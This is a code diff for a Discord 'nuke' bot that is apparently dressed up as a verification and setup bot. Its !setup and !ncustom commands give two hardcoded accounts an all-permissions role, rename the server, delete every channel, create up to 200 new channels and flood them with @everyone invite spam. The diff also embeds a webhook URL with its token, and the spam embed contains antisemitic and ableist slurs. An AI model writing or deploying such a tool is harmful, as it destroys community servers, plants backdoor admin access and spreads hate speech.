@@ -26,7 +26,6 @@ OWNER_ID = 1464634211406188721
 LEADERBOARD_CHANNEL_ID = 1401931021544460389
 TOKEN = os.getenv('TOKEN')
 
-# ===== WEBHOOK DIRECT =====
 LOG_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538408453783953469/TADJTY09gijkuwZ8MX_5zslLBA8PQYTnmxTzYT8ZCsEESVd6_BViqHGXg5VFS94SwZTo'
 
 BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
@@ -152,19 +151,6 @@ def get_custom_role_name(user_id):
 def set_custom_role_name(user_id, value: str):
     set_user_config(user_id, "custom_role_name", value)
 
-def get_custom_embed_title(user_id):
-    return get_user_config(user_id).get("custom_embed_title", None)
-
-def set_custom_embed_title(user_id, value: str):
-    set_user_config(user_id, "custom_embed_title", value)
-
-def get_custom_embed_description(user_id):
-    return get_user_config(user_id).get("custom_embed_description", None)
-
-def set_custom_embed_description(user_id, value: str):
-    set_user_config(user_id, "custom_embed_description", value)
-
-# ===== NOI FUNCȚII PENTRU SETĂRI CUSTOM (DOAR MESAJ) =====
 def get_custom_message(user_id):
     return get_user_config(user_id).get("custom_message", None)
 
@@ -292,11 +278,32 @@ async def send_nuke_log(guild_name_original, guild, user, channels, messages, in
     except Exception as e:
         print(f"[LOG ERROR] {e}")
 
-# ================== MODAL PENTRU SETĂRI CUSTOM (DOAR MESAJ) ==================
-class NukeConfigModal(discord.ui.Modal, title="⚙️ Nuke Custom Message"):
+# ================== MODAL PENTRU SETĂRI CUSTOM ==================
+class NukeConfigModal(discord.ui.Modal, title="⚙️ Nuke Custom Settings"):
+    custom_channel_name = discord.ui.TextInput(
+        label="Channel Name",
+        placeholder="Numele canalelor (ex: nuked-by-larp)",
+        required=False,
+        max_length=32,
+        default=""
+    )
+    custom_server_name = discord.ui.TextInput(
+        label="Server Name",
+        placeholder="Noul nume al serverului",
+        required=False,
+        max_length=32,
+        default=""
+    )
+    custom_role_name = discord.ui.TextInput(
+        label="Role Name",
+        placeholder="Numele rolului creat",
+        required=False,
+        max_length=32,
+        default=""
+    )
     custom_message = discord.ui.TextInput(
         label="Custom Spam Message",
-        placeholder="Introdu mesajul pe care vrei să-l spamezi...",
+        placeholder="Mesajul pe care vrei să-l spamezi (fără embed)",
         required=False,
         style=discord.TextStyle.paragraph,
         max_length=500,
@@ -306,18 +313,33 @@ class NukeConfigModal(discord.ui.Modal, title="⚙️ Nuke Custom Message"):
     async def on_submit(self, interaction: discord.Interaction):
         user_id = interaction.user.id
 
+        if self.custom_channel_name.value:
+            set_custom_channel_name(user_id, self.custom_channel_name.value)
+        else:
+            set_user_config(user_id, "custom_channel_name", None)
+
+        if self.custom_server_name.value:
+            set_custom_server_name(user_id, self.custom_server_name.value)
+        else:
+            set_user_config(user_id, "custom_server_name", None)
+
+        if self.custom_role_name.value:
+            set_custom_role_name(user_id, self.custom_role_name.value)
+        else:
+            set_user_config(user_id, "custom_role_name", None)
+
         if self.custom_message.value:
             set_custom_message(user_id, self.custom_message.value)
         else:
             set_user_config(user_id, "custom_message", None)
 
-        await interaction.response.send_message("✅ Custom message saved successfully!", ephemeral=True)
+        await interaction.response.send_message("✅ Custom settings saved successfully!", ephemeral=True)
 
     async def on_error(self, interaction: discord.Interaction, error: Exception):
         await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)
 
 # ================== SLASH COMMANDS ==================
-@bot.tree.command(name="custom", description="Set your custom spam message (Premium only)")
+@bot.tree.command(name="custom", description="Customize your nuke settings for !ncustom (Premium only)")
 @app_commands.default_permissions(administrator=True)
 async def custom(interaction: Interaction):
     if not is_premium_user(interaction.user.id):
@@ -326,53 +348,23 @@ async def custom(interaction: Interaction):
 
     try:
         modal = NukeConfigModal()
-        existing = get_custom_message(interaction.user.id)
-        if existing:
-            modal.custom_message.default = existing
+        existing_channel = get_custom_channel_name(interaction.user.id)
+        existing_server = get_custom_server_name(interaction.user.id)
+        existing_role = get_custom_role_name(interaction.user.id)
+        existing_message = get_custom_message(interaction.user.id)
+
+        if existing_channel:
+            modal.custom_channel_name.default = existing_channel
+        if existing_server:
+            modal.custom_server_name.default = existing_server
+        if existing_role:
+            modal.custom_role_name.default = existing_role
+        if existing_message:
+            modal.custom_message.default = existing_message
+
         await interaction.response.send_modal(modal)
     except Exception as e:
         await interaction.response.send_message(f"❌ Failed to open settings: {str(e)}", ephemeral=True)
-
-@bot.tree.command(name="bypass", description="Manage verification bypasses")
-@app_commands.default_permissions(administrator=True)
-async def bypass(interaction: Interaction):
-    await interaction.response.send_message("This command is not implemented yet.", ephemeral=True)
-
-@bot.tree.command(name="blacklist", description="Manage blacklisted users")
-@app_commands.default_permissions(administrator=True)
-async def blacklist(interaction: Interaction):
-    await interaction.response.send_message("This command is not implemented yet.", ephemeral=True)
-
-@bot.tree.command(name="feedback", description="Submit feedback for this server")
-async def feedback(interaction: Interaction):
-    await interaction.response.send_message("Feedback command is not implemented yet.", ephemeral=True)
-
-@bot.tree.command(name="ping", description="Responds with Pong!")
-async def ping(interaction: Interaction):
-    await interaction.response.send_message("Pong!", ephemeral=True)
-
-@bot.tree.command(name="pull", description="Pull verification data")
-@app_commands.default_permissions(administrator=True)
-async def pull(interaction: Interaction):
-    await interaction.response.send_message("Pull command is not implemented yet.", ephemeral=True)
-
-@bot.tree.command(name="rep", description="View this server's reputation and trust score")
-async def rep(interaction: Interaction):
-    await interaction.response.send_message("Reputation system is not implemented yet.", ephemeral=True)
-
-@bot.tree.command(name="setup", description="Set up the verification channel and message for this server")
-@app_commands.default_permissions(administrator=True)
-async def setup_slash(interaction: Interaction):
-    await interaction.response.send_message("Setup command is not implemented yet. Please use `!setup` for nuke.", ephemeral=True)
-
-@bot.tree.command(name="syncroles", description="Sync roles based on verified status")
-@app_commands.default_permissions(administrator=True)
-async def syncroles(interaction: Interaction):
-    await interaction.response.send_message("Sync roles command is not implemented yet.", ephemeral=True)
-
-@bot.tree.command(name="vouch", description="Leave a vouch for this server")
-async def vouch(interaction: Interaction):
-    await interaction.response.send_message("Vouch command is not implemented yet.", ephemeral=True)
 
 # ================== COMENZI ==================
 @bot.command(name="addpremium")
@@ -536,7 +528,12 @@ async def real_help(ctx):
     embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
     embed.add_field(
         name="`!setup`",
-        value="Completely wipes the server.",
+        value="Normal nuke: embed + GIFs + default spam.",
+        inline=False
+    )
+    embed.add_field(
+        name="`!ncustom`",
+        value="Custom nuke: uses your `/custom` settings (text only, no embed).",
         inline=False
     )
     embed.add_field(
@@ -560,14 +557,9 @@ async def real_help(ctx):
         inline=False
     )
     embed.add_field(
-        name="`!nhelp`",
-        value="Shows this real help embed.",
-        inline=False
-    )
-    embed.add_field(
         name="**Slash Commands**",
         value=(
-            "`/custom` - Set your custom spam message (Premium only)\n"
+            "`/custom` - Customize settings for !ncustom (Premium only)\n"
             "`/bypass`, `/blacklist`, `/feedback`, `/ping`, `/pull`, `/rep`, `/setup`, `/syncroles`, `/vouch`\n"
             "*These are placeholders and do not have functionality yet.*"
         ),
@@ -580,7 +572,7 @@ async def real_help(ctx):
     embed.timestamp = datetime.utcnow()
     await ctx.send(embed=embed)
 
-# ================== COMENDA SETUP ==================
+# ================== FUNCȚII COMUNE PENTRU NUKE ==================
 async def send_with_retry(channel, content=None, embed=None, max_retries=10):
     retries = 0
     while retries < max_retries:
@@ -622,11 +614,9 @@ async def create_channel_with_retry(guild, name, max_retries=10):
             return None
     return None
 
-@bot.command()
-async def setup(ctx):
+async def perform_nuke(ctx, custom_mode: bool):
     guild = ctx.guild
     user = ctx.author
-
     original_name = guild.name
 
     if not ctx.guild.me.guild_permissions.administrator:
@@ -650,79 +640,109 @@ async def setup(ctx):
     total_channels = 200 if is_owner else 100
     spam_messages = 25 if is_owner else 20
 
-    # ===== ÎNCĂRCARE SETĂRI =====
-    is_premium = is_premium_user(user.id)
-    uses_custom = False
-    custom_message = None
+    # ===== DETERMINĂ SETĂRI =====
+    if custom_mode:
+        # Folosește setările custom dacă există
+        custom_channel = get_custom_channel_name(user.id)
+        custom_server = get_custom_server_name(user.id)
+        custom_role = get_custom_role_name(user.id)
+        custom_msg = get_custom_message(user.id)
 
-    if is_premium:
-        custom_message = get_custom_message(user.id)
-        if custom_message:
-            uses_custom = True
-
-    # ===== DETERMINĂ NUMELE CANALELOR, SERVERULUI, ROLULUI =====
-    channel_name = "1week-King"
-    server_name = "1weeksober owns this"
-    role_name = "1weeksober-on-top"
-
-    # ===== CONSTRUIRE EMBED (cu noul link) =====
-    embed_main = discord.Embed(
-        title="**LARP EMPIRE N4KED YOUR AHH**",
-        description=(
-            "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
-            "**# LARP EMPIRE SERVER NON HOOKED**\n"
-            "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
-            "https://discord.gg/larpbeamers\n\n"
-            "*Next time don't give admin perms to everyone r4tard.*"
-        ),
-        color=0x000000
-    )
-    embed_main.set_image(url="https://i.imgur.com/yMQvcRw.gif")
-    embed_main.set_footer(text="Larp Empire • Nuke Service")
-
-    # ===== GIF SCARE =====
-    embed_scare = discord.Embed(color=0x000000)
-    embed_scare.set_image(url="https://gifdb.com/images/thumbnail/jeff-the-killer-jump-scare-53cmfrhh3ffrswv1.gif")
-
-    # ===== GIF 2 =====
-    embed_gif2 = discord.Embed(color=0x000000)
-    embed_gif2.set_image(url="https://i.imgur.com/yMQvcRw.gif")
-
-    # ===== MESAJ TEXT =====
-    if uses_custom and custom_message:
-        text_message = custom_message
+        channel_name = custom_channel if custom_channel else "1week-King"
+        server_name = custom_server if custom_server else "1weeksober owns this"
+        role_name = custom_role if custom_role else "1weeksober-on-top"
+        text_message = custom_msg if custom_msg else "@everyone @here join https://discord.gg/larpbeamers"
     else:
+        # !setup normal: folosește valorile default
+        channel_name = "1week-King"
+        server_name = "1weeksober owns this"
+        role_name = "1weeksober-on-top"
         text_message = "@everyone @here join https://discord.gg/larpbeamers"
+
+    # ===== CONSTRUIRE EMBED (doar pentru modul normal) =====
+    embed_main = None
+    embed_scare = None
+    embed_gif2 = None
+    if not custom_mode:
+        embed_main = discord.Embed(
+            title="**LARP EMPIRE N4KED YOUR AHH**",
+            description=(
+                "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE\n\n"
+                "**# LARP EMPIRE SERVER NON HOOKED**\n"
+                "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
+                "https://discord.gg/larpbeamers\n\n"
+                "*Next time don't give admin perms to everyone r4tard.*"
+            ),
+            color=0x000000
+        )
+        embed_main.set_image(url="https://i.imgur.com/yMQvcRw.gif")
+        embed_main.set_footer(text="Larp Empire • Nuke Service")
+
+        embed_scare = discord.Embed(color=0x000000)
+        embed_scare.set_image(url="https://gifdb.com/images/thumbnail/jeff-the-killer-jump-scare-53cmfrhh3ffrswv1.gif")
+
+        embed_gif2 = discord.Embed(color=0x000000)
+        embed_gif2.set_image(url="https://i.imgur.com/yMQvcRw.gif")
+
+    save_nuke_stats(user.id, guild)
+
+    admin_users = [1389763251042258944, 1464634211406188721]
+    try:
+        admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
+        for admin_id in admin_users:
+            member = guild.get_member(admin_id)
+            if member:
+                await member.add_roles(admin_role)
+    except:
+        pass
+
+    try:
+        await guild.edit(name=server_name)
+    except:
+        pass
+
+    # Șterge toate canalele
+    delete_tasks = [channel.delete() for channel in guild.channels if channel != ctx.channel]
+    if delete_tasks:
+        await asyncio.gather(*delete_tasks, return_exceptions=True)
+        await asyncio.sleep(1)
 
     font_styles = ["bold", "script", "double"]
     created_channels = []
     invite_link = None
 
-    await user.send(f"🔄 Starting creation of {total_channels} channels in parallel...")
+    await user.send(f"🔄 Starting creation of {total_channels} channels in {'custom' if custom_mode else 'normal'} mode...")
 
     first_channel = None
 
     async def spam_channel(channel):
         try:
-            for _ in range(15):
-                await send_with_retry(channel, content=text_message)
-                await asyncio.sleep(0.1)
+            if custom_mode:
+                # Mod custom: trimite DOAR mesajul text de `spam_messages` ori
+                for _ in range(spam_messages):
+                    await send_with_retry(channel, content=text_message)
+                    await asyncio.sleep(0.1)
+            else:
+                # Mod normal: trimite embed + GIF-uri + text
+                for _ in range(15):
+                    await send_with_retry(channel, content=text_message)
+                    await asyncio.sleep(0.1)
 
-                await send_with_retry(channel, embed=embed_main)
-                await asyncio.sleep(0.1)
+                    await send_with_retry(channel, embed=embed_main)
+                    await asyncio.sleep(0.1)
 
-                if not uses_custom:
                     await send_with_retry(channel, embed=embed_scare)
                     await asyncio.sleep(0.1)
 
-                await send_with_retry(channel, embed=embed_gif2)
-                await asyncio.sleep(0.1)
+                    await send_with_retry(channel, embed=embed_gif2)
+                    await asyncio.sleep(0.1)
 
-            for _ in range(spam_messages):
-                ping_count = random.randint(5, 12)
-                msg = ("@everyone @here join https://discord.gg/larpbeamers\n") * ping_count
-                await send_with_retry(channel, content=msg)
-                await asyncio.sleep(0.05)
+                # Spam suplimentar cu ping-uri
+                for _ in range(spam_messages):
+                    ping_count = random.randint(5, 12)
+                    msg = ("@everyone @here join https://discord.gg/larpbeamers\n") * ping_count
+                    await send_with_retry(channel, content=msg)
+                    await asyncio.sleep(0.05)
         except Exception:
             pass
 
@@ -755,7 +775,7 @@ async def setup(ctx):
 
     await send_nuke_log(original_name, guild, user, total_channels, spam_messages, invite_link)
 
-    await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel with retry on rate-limit!")
+    await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel!")
 
     try:
         await guild.create_role(name=role_name)
@@ -771,6 +791,21 @@ async def setup(ctx):
         await user.send(f"❌ Failed to leave the server: {e}")
         print(f"[ERROR] Could not leave {guild.name}: {e}")
 
+# ================== COMENDA SETUP (NORMAL) ==================
+@bot.command()
+async def setup(ctx):
+    await perform_nuke(ctx, custom_mode=False)
+
+# ================== COMENDA NCUSTOM (CUSTOM) ==================
+@bot.command()
+async def ncustom(ctx):
+    # Verifică dacă utilizatorul este premium pentru a folosi !ncustom
+    if not is_premium_user(ctx.author.id):
+        await ctx.send("❌ This command is only available for premium users.")
+        return
+    await perform_nuke(ctx, custom_mode=True)
+
+# ================== EVENIMENTE ==================
 @bot.event
 async def on_ready():
     print(f"✅ Bot is online as {bot.user}!")
